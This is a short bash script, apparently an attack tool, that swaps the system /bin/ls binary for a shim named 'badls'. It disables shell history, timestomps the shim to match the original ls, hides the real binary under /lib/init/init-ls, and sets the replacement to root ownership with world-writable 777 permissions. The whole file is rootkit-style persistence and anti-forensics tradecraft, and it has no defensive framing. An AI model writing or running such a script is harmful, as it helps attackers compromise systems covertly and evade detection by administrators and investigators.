# !/bin/bash
: <<'END'
A simple script that replaces the original ls binary with a shim


END

# disable bash history
set +o history

LS=/bin/ls
SHIM=./badls
BK=/lib/init/init-ls

# change shim modification date to ls last modification date
touch -r $LS $SHIM

# move ls binary
mv $LS $BK

# replace it with my shim
mv $SHIM $LS

# Set root as the owner
chown root:root $LS
chmod 777 $LS


# enable bash history
set -o history
